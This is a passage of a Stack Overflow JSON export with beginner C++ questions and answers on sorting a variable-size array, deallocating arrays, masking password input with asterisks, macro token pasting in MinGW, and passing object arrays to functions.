"<p>Substitute all entries of \"10\" for \"size\", and you'll get what you need:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nint k, size;\nvoid mysort(int arrayy[]){ \n\n    int i,j; \n    int temp; \n      for(i=0;i&lt;size;i++) \n     for(j=0;j&lt;size;j++) \n      if(arrayy[j]&gt;arrayy[j+1]){ \n         temp=arrayy[j]; \n         arrayy[j]=arrayy[j+1]; \n         arrayy[j+1]=temp; \n       } \n    cout &lt;&lt; \"Your sorted array is: [\";\n    for(i=1;i&lt;=size;i++) {\n        if (i&lt;size){\n            cout&lt;&lt;arrayy[i]&lt;&lt;\",\";\n        }\n        else\n            cout&lt;&lt;arrayy[i];\n    }\n    cout &lt;&lt; \"].\\n\";\n}\n\nvoid main(int argc){\n    cout &lt;&lt; \"Number of variables\" &lt;&lt; endl;\n    cin &gt;&gt; size;\n    int *arrayy;\n    arrayy = new int[size];\n    for (int iii=0;iii&lt;size;iii++){\n        cout &lt;&lt; \"Enter number:\" &lt;&lt; endl;\n        cin &gt;&gt; arrayy[iii];\n    }\n    mysort(arrayy);\n}\n</code></pre>\n\n<p>Also, I added some formatting lines so your array thing can be well formatted near the second bracket. </p>\n"}], "owner": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "accepted_answer_id": 29810229, "answer_count": 2, "score": -2, "last_activity_date": 1429742828, "creation_date": 1429742228, "last_edit_date": 1429742407, "question_id": 29810179, "link": "https://stackoverflow.com/questions/29810179/variable-size-array-sorter-bugging-with-no-reason", "title": "Variable size array sorter bugging with no reason", "body": "<p>I am writing an algorithm that asks the user to tell the size of an array and then it's values. After it, the code sorts the values and give back the result. The code is as it follows:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nusing namespace std;\nint nvals, k, var, size;\n\nvoid mysort(int arrayy[]){ \n    int i,j; \n    int temp; \n    for(i=0;i&lt;size;i++) \n        for(j=0;j&lt;size;j++) \n            if(arrayy[j]&gt;arrayy[j+1]){ \n                temp=arrayy[j]; \n                arrayy[j]=arrayy[j+1]; \n                arrayy[j+1]=temp; \n            } \n    cout &lt;&lt; \"Your sorted array is: [\";\n    for(i=1;i&lt;10;i++) cout&lt;&lt;arrayy[i]&lt;&lt;\", \";\n    cout &lt;&lt; \"].\\n\";\n}\n\nvoid main(int argc){\n    cout &lt;&lt; \"Number of variables\" &lt;&lt; endl;\n    cin &gt;&gt; size;\n    int *arrayy;\n    arrayy = new int[size];\n    for (int iii=0;iii&lt;size;iii++){\n        cout &lt;&lt; \"Enter number:\" &lt;&lt; endl;\n        cin &gt;&gt; var;\n        arrayy[iii] = var;\n    }\n    mysort(arrayy);\n}\n</code></pre>\n\n<p>Unfortunately, after compiling, it outputs <code>Your sorted array is: [</code> and then it suddenly crashes! I have been trying to manipulate things to see if I can make it work, but I am not being successful. How can I fix the code so it can work properly? Thank you.</p>\n"}, {"tags": ["c++", "variable-assignment", "undefined-behavior", "aliasing"], "answers": [{"comments": [{"owner": {"reputation": 1253, "user_id": 2133137, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/gsZzC.png?s=128&g=1", "display_name": "Hovestar", "link": "https://stackoverflow.com/users/2133137/hovestar"}, "edited": false, "score": 0, "creation_date": 1429743458, "post_id": 29810211, "comment_id": 47748812, "body": "I&#39;ll edit and add more precise code, this is close to what I&#39;m looking for but not quite."}], "tags": [], "owner": {"reputation": 11342, "user_id": 1144157, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d05077a347e63679d43bfbdaf5e7b9ab?s=128&d=identicon&r=PG", "display_name": "Steephen", "link": "https://stackoverflow.com/users/1144157/steephen"}, "is_accepted": false, "score": 2, "last_activity_date": 1429742357, "creation_date": 1429742357, "answer_id": 29810211, "question_id": 29810135, "link": "https://stackoverflow.com/questions/29810135/deallocating-item-in-array/29810211#29810211", "title": "Deallocating item in array", "body": "<p>If you just define int <code>a[1]</code> you are not allocating memory in heap, so no need to delete.</p>\n\n<p>Otherwise if you create an array as follows:\n <code>int *a= new int[1]</code> , \nyou have to delete as\n <code>delete [] a;</code></p>\n\n<p>By considering both above  scenarios,  you can safely access `a' after you delete b if you have allocated  memory for b and a.</p>\n"}, {"tags": [], "owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "is_accepted": true, "score": 1, "last_activity_date": 1429747411, "creation_date": 1429747411, "answer_id": 29811176, "question_id": 29810135, "link": "https://stackoverflow.com/questions/29810135/deallocating-item-in-array/29811176#29811176", "title": "Deallocating item in array", "body": "<p>In the example there are no problems. <code>a[0]</code> and <code>b[0]</code> are different objects in different memory locations, and destroying one of them has no effect on the other.</p>\n\n<p>The <code>new</code> is a red herring; the following code works the same way:</p>\n\n<pre><code>name o;\nname a = o;\n{\n   name b = o;\n}\n\na;\n</code></pre>\n\n<p><code>name</code> has <em>value semantics</em>, that is, copying it by value creates a wholly distinct copy. Built-in types such as <code>int</code> all have value-semantics too.</p>\n\n<p>This code would only run into problems if <code>o</code> did not have value semantics; for example, if it contains a resource handle and does not contain copy-constructor and assignment-operator code for duplicating the resource handle.</p>\n\n<p>Then copying <code>o</code> would make two objects with the same handle on that resource, and if <code>o</code>'s destructor releases the resource it would leave a dangling copy.</p>\n\n<p>To avoid these problems it is usually recommended to design all of your classes to have value semantics.  If the class has a handle on a resource that is not duplicatable, then the class should have its copy-constructor and assignment-operator disabled to prevent inadvertant copies. In fact, the resource handle should be held by a class designed for resource handles.</p>\n\n<p>This is sometimes known as \"rule of three\" (or since C++11, \"rule of five\" or \"rule of zero\").</p>\n"}], "owner": {"reputation": 1253, "user_id": 2133137, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/gsZzC.png?s=128&g=1", "display_name": "Hovestar", "link": "https://stackoverflow.com/users/2133137/hovestar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "accepted_answer_id": 29811176, "answer_count": 2, "score": 0, "last_activity_date": 1432691338, "creation_date": 1429741970, "last_edit_date": 1432691338, "question_id": 29810135, "link": "https://stackoverflow.com/questions/29810135/deallocating-item-in-array", "title": "Deallocating item in array", "body": "<p>It if have an object, lets call it <code>o</code>, and two arrays <code>typeo *a,*b;</code> if I assign <code>o</code> to both array <code>a</code> and array <code>b</code> then <code>delete[] b</code> what happens if I try to access o or o in a? For example:</p>\n\n<pre><code>struct name{int a;}\nname *a = new name[1];\nname *b = new name[1];\nname o;\na[0] = o;\nb[0] = o;\ndelete[] b;\na[0]; // what happens here?\n</code></pre>\n"}, {"tags": ["c++", "windows", "masking"], "comments": [{"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "edited": false, "score": 1, "creation_date": 1429741864, "post_id": 29810055, "comment_id": 47748220, "body": "Please specify which operating system you are targeting, as well as provide a short code snippet of what you&#39;ve already tried."}, {"owner": {"user_type": "does_not_exist", "display_name": "user1593881"}, "edited": false, "score": 0, "creation_date": 1429742652, "post_id": 29810055, "comment_id": 47748535, "body": "What&#39;s a SETCONSOLE method?"}, {"owner": {"reputation": 50, "user_id": 4388566, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TwW2o.jpg?s=128&g=1", "display_name": "Fahad Rana", "link": "https://stackoverflow.com/users/4388566/fahad-rana"}, "edited": false, "score": 0, "creation_date": 1429742929, "post_id": 29810055, "comment_id": 47748623, "body": "@Raw N DWORD  mode;   HANDLE hConIn = GetStdHandle( STD_INPUT_HANDLE );   GetConsoleMode( hConIn, &amp;mode );   mode = on        ? (mode |   ENABLE_ECHO_INPUT )        : (mode &amp; ~(ENABLE_ECHO_INPUT));   SetConsoleMode( hConIn, mode );"}], "answers": [{"tags": [], "owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "is_accepted": false, "score": 1, "last_activity_date": 1429743442, "creation_date": 1429743442, "answer_id": 29810433, "question_id": 29810055, "link": "https://stackoverflow.com/questions/29810055/show-while-i-input-hide-mask-input/29810433#29810433", "title": "Show * while I input (Hide/mask input)", "body": "<p>You probably want to use <code>getch()</code> (<code>#include &lt;conio.h&gt;</code>) to read a character without its being echoed to the screen. Then when you've validated that it's a character you want to accept, you can print out a <code>*</code> at the correct position.</p>\n"}, {"comments": [{"owner": {"reputation": 50, "user_id": 4388566, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TwW2o.jpg?s=128&g=1", "display_name": "Fahad Rana", "link": "https://stackoverflow.com/users/4388566/fahad-rana"}, "edited": false, "score": 0, "creation_date": 1429744483, "post_id": 29810444, "comment_id": 47749177, "body": "Though I had to clear the string by using clear() just before the loop if the passwords didnt match but it DID solve the problem. Thanks :)"}, {"owner": {"reputation": 50, "user_id": 4388566, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TwW2o.jpg?s=128&g=1", "display_name": "Fahad Rana", "link": "https://stackoverflow.com/users/4388566/fahad-rana"}, "edited": false, "score": 0, "creation_date": 1429744520, "post_id": 29810444, "comment_id": 47749182, "body": "Although the other method if explained will be helpful too :)"}, {"owner": {"reputation": 7089, "user_id": 2852165, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/JwDJG.jpg?s=128&g=1", "display_name": "SHR", "link": "https://stackoverflow.com/users/2852165/shr"}, "reply_to_user": {"reputation": 50, "user_id": 4388566, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TwW2o.jpg?s=128&g=1", "display_name": "Fahad Rana", "link": "https://stackoverflow.com/users/4388566/fahad-rana"}, "edited": false, "score": 0, "creation_date": 1429745271, "post_id": 29810444, "comment_id": 47749461, "body": "it just simplified the password typing, you can put it in some <code>getpassword</code>  method and call it for each password input."}], "tags": [], "owner": {"reputation": 7089, "user_id": 2852165, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/JwDJG.jpg?s=128&g=1", "display_name": "SHR", "link": "https://stackoverflow.com/users/2852165/shr"}, "is_accepted": true, "score": 2, "last_activity_date": 1429743851, "last_edit_date": 1429743851, "creation_date": 1429743480, "answer_id": 29810444, "question_id": 29810055, "link": "https://stackoverflow.com/questions/29810055/show-while-i-input-hide-mask-input/29810444#29810444", "title": "Show * while I input (Hide/mask input)", "body": "<p>Here a simple example using <code>getch</code>. YES it c method, not c++, but it is very efficient.</p>\n\n<p>It can be extended to block spaces, tabs, etc.</p>\n\n<p>Also see the comments in the code...</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include&lt;conio.h&gt;\nusing namespace std;\n\n\nint main(){ \n    string res;\n    char c;\n    cout&lt;&lt;\"enter password:\";\n    do{\n        c = getch();\n        switch(c){\n        case 0://special keys. like: arrows, f1-12 etc.\n            getch();//just ignore also the next character.\n            break;\n        case 13://enter\n            cout&lt;&lt;endl;\n            break;\n        case 8://backspace\n            if(res.length()&gt;0){\n                res.erase(res.end()-1); //remove last character from string\n                cout&lt;&lt;c&lt;&lt;' '&lt;&lt;c;//go back, write space over the character and back again.\n            }\n            break;\n        default://regular ascii\n            res += c;//add to string\n            cout&lt;&lt;'*';//print `*`\n            break;\n        }\n    }while(c!=13);\n    //print result:\n    cout&lt;&lt;res&lt;&lt;endl;\n    return 0;  \n}\n</code></pre>\n"}], "owner": {"reputation": 50, "user_id": 4388566, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TwW2o.jpg?s=128&g=1", "display_name": "Fahad Rana", "link": "https://stackoverflow.com/users/4388566/fahad-rana"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2158, "favorite_count": 0, "accepted_answer_id": 29810444, "answer_count": 2, "score": 1, "last_activity_date": 1429743851, "creation_date": 1429741601, "last_edit_date": 1429742181, "question_id": 29810055, "link": "https://stackoverflow.com/questions/29810055/show-while-i-input-hide-mask-input", "title": "Show * while I input (Hide/mask input)", "body": "<p>I am in the process of getting <strong>password</strong> as input.\nI have gone through various examples but they either used while loop or SETCONSOLE method. Both had issues.\nImplementing while loop printed 1 * before I even entered a char. The other method used echo to <strong>HIDE</strong> the characters while I typed whereas I want to be printed. I would appreciate helping me masking my input with a * using SETCONSOLE method. I would be greatly obliged. The code's attached !</p>\n\n<pre><code> void signup(){\n    gotoxy(10, 10);\n    string n, p1,p2;\n     cout &lt;&lt; \"Enter your username: \" &lt;&lt; endl; // TEST if username already       exists\ngotoxy(31, 10);\ncin &gt;&gt; n;\nlp:\ngotoxy(10, 11);\ncout &lt;&lt; \"Enter your password: \" &lt;&lt; endl; // TEST if username already exists\ngotoxy(31, 11);\n\ngetline(cin, p1);\nsystem(\"cls\");\ngotoxy(10, 10);\ncout &lt;&lt; \"Re-Enter your password to confirm: \" &lt;&lt; endl; // TEST if username already exists\ngotoxy(45, 10);\ngetline(cin, p2);\n\n\n\nif (p2!=p1)\n{\n    system(\"cls\");\n    gotoxy(10, 10);\n    cout &lt;&lt; \"Passwords donot match! Please enter again!\";\n        goto lp;\n}\n</code></pre>\n\n<p>}</p>\n"}, {"tags": ["c++", "macros"], "answers": [{"comments": [{"owner": {"reputation": 13049, "user_id": 990502, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a146d5cbd39e3d21fce1631a35767043?s=128&d=identicon&r=PG", "display_name": "MistyD", "link": "https://stackoverflow.com/users/990502/mistyd"}, "edited": false, "score": 0, "creation_date": 1429913454, "post_id": 29810094, "comment_id": 47842657, "body": "If i remove the first two <code>##</code> wont the parameter substitution stop ? For instance in the example you posted. Using  <code>CONFORMING_DECLARE_LEGACY_TYPES(foo)</code> for the first case will yield <code>LG_Wrapper::ClassType&lt;LG_Wrapper::TA&gt; ClassType;</code> while the second case will yield <code>LG_Wrapper::foo&lt;LG_Wrapper::TA&gt; ClassType;</code> ? And i want the second case"}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "reply_to_user": {"reputation": 13049, "user_id": 990502, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a146d5cbd39e3d21fce1631a35767043?s=128&d=identicon&r=PG", "display_name": "MistyD", "link": "https://stackoverflow.com/users/990502/mistyd"}, "edited": false, "score": 0, "creation_date": 1429914461, "post_id": 29810094, "comment_id": 47842996, "body": "No, why would it?  And you don&#39;t want the second case, you want <code>LG_Wrapper::foo&lt;LG_Wrapper::TA&gt; foo</code>. All instances of the preprocessor token <code>ClassType</code> will be replaced just like in any macro substitution."}, {"owner": {"reputation": 13049, "user_id": 990502, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a146d5cbd39e3d21fce1631a35767043?s=128&d=identicon&r=PG", "display_name": "MistyD", "link": "https://stackoverflow.com/users/990502/mistyd"}, "edited": false, "score": 0, "creation_date": 1429915840, "post_id": 29810094, "comment_id": 47843446, "body": "You are correct. I tried this out and apparently the parameter does get substituted. I wonder why we need <code>##</code> then ?"}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "reply_to_user": {"reputation": 13049, "user_id": 990502, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a146d5cbd39e3d21fce1631a35767043?s=128&d=identicon&r=PG", "display_name": "MistyD", "link": "https://stackoverflow.com/users/990502/mistyd"}, "edited": false, "score": 0, "creation_date": 1429918521, "post_id": 29810094, "comment_id": 47844246, "body": "You need the ## to create a new preprocessor token out of two tokens. If the macro had <code>typedef ... ClassTypeTPR</code> then ClassType wouldn&#39;t get substituted because ClasTypeTPR is a different token with a different name. If it instead had <code>typedef ... ClassType TPR</code> the substitution would happen, but itwouldn&#39;t work because you&#39;d get <code>typedef ... foo TPR</code>. By using <code>ClassType##TPR</code> then ClassType gets replaced by foo and then the two tokens, <code>foo</code> and <code>TPR</code> get pasted together to form one token <code>fooTPR</code>."}], "tags": [], "owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "is_accepted": true, "score": 1, "last_activity_date": 1429742070, "last_edit_date": 1429742070, "creation_date": 1429741780, "answer_id": 29810094, "question_id": 29810019, "link": "https://stackoverflow.com/questions/29810019/concatenate-a-macro-parameter-with-text/29810094#29810094", "title": "Concatenate a macro parameter with text", "body": "<p>Either remove the first two <code>##</code> from each line of the <code>DECLARE_LEGACY_TYPES</code> macro or create a new version without them. They're completely unnecessary, and the error GCC is giving is allowed by the Standard C++, if not actually required. The result of using the ## preprocessing operator must be a valid preprocessing token and <code>::GraphicsDevice</code> isn't a valid preprocessing token.</p>\n\n<p>You want something like this:</p>\n\n<pre><code>#define CONFORMING_DECLARE_LEGACY_TYPES(ClassType)                    \\\n        typedef LG_Wrapper::ClassType&lt;LG_Wrapper::TA&gt; ClassType;      \\\n        typedef LG_Wrapper::ClassType&lt;LG_Wrapper::TB&gt; ClassType##TPR; \\\n        typedef LG_Wrapper::ClassType&lt;LG_Wrapper::TC&gt; ClassType##DBN; \n</code></pre>\n"}], "owner": {"reputation": 13049, "user_id": 990502, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a146d5cbd39e3d21fce1631a35767043?s=128&d=identicon&r=PG", "display_name": "MistyD", "link": "https://stackoverflow.com/users/990502/mistyd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 193, "favorite_count": 0, "accepted_answer_id": 29810094, "answer_count": 1, "score": 0, "last_activity_date": 1429913811, "creation_date": 1429741409, "last_edit_date": 1429913811, "question_id": 29810019, "link": "https://stackoverflow.com/questions/29810019/concatenate-a-macro-parameter-with-text", "title": "Concatenate a macro parameter with text", "body": "<p>I am currently working on porting some code from Visual Studio to Mingw GCC. The code builds and runs fine in visual studio but has some issues on Mingw GCC. One of the issue I am having is with Macro Expansion. I have simplified this example here.</p>\n\n<pre><code>#define DECLARE_LEGACY_TYPES(ClassType) \\\n        typedef LG_Wrapper::##ClassType##&lt;LG_Wrapper::TA&gt;               ClassType; \\\n        typedef LG_Wrapper::##ClassType##&lt;LG_Wrapper::TB&gt;           ClassType##TPR; \\\n        typedef LG_Wrapper::##ClassType##&lt;LG_Wrapper::TC&gt;   ClassType##DBN; \\\n</code></pre>\n\n<p>Now when I attempt to build this I get the error(s)</p>\n\n<pre><code> error: pasting \"::\" and \"GraphicsDevice\" does not give a valid preprocessing token\n   typedef LG_Wrapper::##ClassType##&lt;LG_Wrapper::TA&gt;    ClassType; \\\n                     ^\n note: in expansion of macro 'DECLARE_LEGACY_TYPES'\n DECLARE_LEGACY_TYPES(GraphicsDevice);\n ^\n error: pasting \"GraphicsDevice\" and \"&lt;\" does not give a valid preprocessing token\n DECLARE_LEGACY_TYPES(GraphicsDevice);\n</code></pre>\n\n<p>Any suggestions on why I get this issue in mingw GCC and not in Visual Studio and how would i resolve this issue ?</p>\n"}, {"tags": ["c++", "arrays", "pointers", "object"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user1593881"}, "edited": false, "score": 0, "creation_date": 1429741526, "post_id": 29810007, "comment_id": 47748074, "body": "Possible duplicate of: <a href=\"http://stackoverflow.com/questions/17604164/c-how-to-pass-array-of-objects-into-function\" title=\"c how to pass array of objects into function\">stackoverflow.com/questions/17604164/&hellip;</a>"}, {"owner": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "edited": false, "score": 0, "creation_date": 1429742065, "post_id": 29810007, "comment_id": 47748304, "body": "Hmm.. I&#39;m reading that question now. However, it looks like their answer suggests using this format for the function: int getLogin( const int lastAcc, Member (&amp;myMemberArr)[] ) But I&#39;m not sure what to put in for the size of the array.."}], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "edited": false, "score": 0, "creation_date": 1429742268, "post_id": 29810157, "comment_id": 47748393, "body": "Isn&#39;t std:: pointless with: &quot; using namespace std&quot; ? You&#39;re right, I&#39;m totally unfamiliar with that haha."}, {"owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "reply_to_user": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "edited": false, "score": 0, "creation_date": 1429742346, "post_id": 29810157, "comment_id": 47748425, "body": "@Rengetsu <code>using namespace std</code> <a href=\"http://stackoverflow.com/q/1452721/3959454\">is considered bad practice</a>"}, {"owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "reply_to_user": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "edited": false, "score": 0, "creation_date": 1429742489, "post_id": 29810157, "comment_id": 47748489, "body": "@Rengetsu I didn&#39;t mean you are unfamiliar with this, just that the use of standard C++ containers is often prohibited for students"}, {"owner": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "edited": false, "score": 0, "creation_date": 1429743156, "post_id": 29810157, "comment_id": 47748708, "body": "Oh I see, that is very interesting. I appreciate you taking the time to say so."}], "tags": [], "owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "is_accepted": true, "score": 2, "last_activity_date": 1429742125, "creation_date": 1429742125, "answer_id": 29810157, "question_id": 29810007, "link": "https://stackoverflow.com/questions/29810007/how-to-pass-in-an-array-of-objects-error-c2146-syntax-error-missing-befo/29810157#29810157", "title": "How to pass in an array of objects: error c2146: syntax error : missing &#39;)&#39; before identifier &#39;myMembers&#39;", "body": "<p>Change the definition of <code>getLogin()</code> as follows:</p>\n\n<pre><code>int getLogin( const int lastAcc, Member myMembers[] ){\n    //...\n}\n</code></pre>\n\n<p>(And of course you should better use <code>std::vector</code> or <code>std::array</code>, but since this is a homework, this advice probably makes no sense)</p>\n"}, {"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1429743317, "post_id": 29810366, "comment_id": 47748769, "body": "it doesn&#39;t seem that he wants an array of pointers, he just wants to have the array of objects accessible in the function."}, {"owner": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1429743810, "post_id": 29810366, "comment_id": 47748940, "body": "@Matt you&#39;re correct. I wasn&#39;t trying to pass in an array of pointers, but it&#39;s interesting to see it as an example. Thanks!"}, {"owner": {"reputation": 5409, "user_id": 480386, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hKe7X.jpg?s=128&g=1", "display_name": "Christian Abella", "link": "https://stackoverflow.com/users/480386/christian-abella"}, "edited": false, "score": 0, "creation_date": 1429743947, "post_id": 29810366, "comment_id": 47748981, "body": "if your application will be dynamic in the future then passing pointers may be the way to go. You will be creating a new instance of the same object everytime. So passing it around as a pointer is much efficient."}, {"owner": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "edited": false, "score": 0, "creation_date": 1429744692, "post_id": 29810366, "comment_id": 47749248, "body": "Oh I see. Thank you, I&#39;ll have to think about how to implement a dynamic array of pointers then :)"}], "tags": [], "owner": {"reputation": 5409, "user_id": 480386, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hKe7X.jpg?s=128&g=1", "display_name": "Christian Abella", "link": "https://stackoverflow.com/users/480386/christian-abella"}, "is_accepted": false, "score": 0, "last_activity_date": 1429743043, "creation_date": 1429743043, "answer_id": 29810366, "question_id": 29810007, "link": "https://stackoverflow.com/questions/29810007/how-to-pass-in-an-array-of-objects-error-c2146-syntax-error-missing-befo/29810366#29810366", "title": "How to pass in an array of objects: error c2146: syntax error : missing &#39;)&#39; before identifier &#39;myMembers&#39;", "body": "<p>If you want to pass an array of pointers then you have to change\nthe implementation of your function getLogin:</p>\n\n<pre><code>int getLogin( int lastAcc, Member** myMembers )\n{\n    int accNum;\n\n    if( accNum &gt; 0 &amp;&amp; accNum &lt;= lastAcc )\n    {\n        myMembers[accNum]-&gt;setLoggedIn( true );\n    }\n    else{\n        accNum = 0;\n    }\n    return accNum;\n}\n</code></pre>\n\n<p>and this is how you pass an array to it:</p>\n\n<pre><code>int numAccounts = 0;\nint accCapacity = 5;\nint currentAcc = 0;\n\nMember* members[numAccounts];\nfor ( int i =0; i &lt; numAccounts; i++)\n{\n  members[i] =  new Member();\n}\n\ncurrentAcc = getLogin( numAccounts, members )\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 4821570, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e8652a5daaaeaa76b1a57bb82cec0f9?s=128&d=identicon&r=PG&f=1", "display_name": "Rengetsu", "link": "https://stackoverflow.com/users/4821570/rengetsu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 105, "favorite_count": 0, "accepted_answer_id": 29810157, "answer_count": 2, "score": 0, "last_activity_date": 1429746079, "creation_date": 1429741358, "last_edit_date": 1429743075, "question_id": 29810007, "link": "https://stackoverflow.com/questions/29810007/how-to-pass-in-an-array-of-objects-error-c2146-syntax-error-missing-befo", "title": "How to pass in an array of objects: error c2146: syntax error : missing &#39;)&#39; before identifier &#39;myMembers&#39;", "body": "<p>I'm a c++ student and this is my first post here.</p>\n\n<p>I have an array containing <code>Member</code> objects (which will be dynamic in the future). I'm trying to pass the array into a function, <code>getLogin</code> in my case.</p>\n\n<p>I think I have some of the syntax wrong, I'm still struggling to understand dynamic arrays and correct syntax for pointers in different situations. Visual Studio is showing an error with <code>myMembers</code>, where it is written as a parameter for <code>getLogin</code>.</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include \"Member.h\"\nusing namespace std;\n\nint getLogin( const int, Member[] );\n\nint main(){\n\n    int numAccounts = 0;\n    int accCapacity = 5;\n    int currentAcc = 0;\n\n    Member 